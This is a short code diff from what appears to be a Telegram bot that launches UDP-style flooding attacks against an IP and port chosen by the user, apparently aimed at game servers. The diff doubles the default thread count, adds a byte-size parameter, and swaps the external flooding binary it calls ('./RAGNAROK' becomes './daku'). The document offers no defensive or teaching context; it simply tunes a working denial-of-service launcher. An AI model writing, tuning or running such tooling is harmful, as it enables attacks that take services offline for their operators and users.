@@ -12,7 +12,8 @@ DATABASE_NAME = "bot_db"
 USERS_COLLECTION = "users"
 KEYS_COLLECTION = "keys"
 
-DEFAULT_THREADS = 500
+DEFAULT_THREADS = 1000
+DEFAULT_BYTE = 200
 flooding_process = None
 flooding_command = None
 
@@ -112,7 +113,7 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         return
 
     target_ip, port, duration = context.args
-    flooding_command = ['./RAGNAROK', target_ip, port, duration, str(DEFAULT_THREADS)]
+    flooding_command = ['./daku', target_ip, port, duration, str(DEFAULT_BYTE), str(DEFAULT_THREADS)]
     await update.message.reply_text(f"**Flooding parameters set:** `{target_ip}:{port}` for `{duration}` seconds.")
 
 
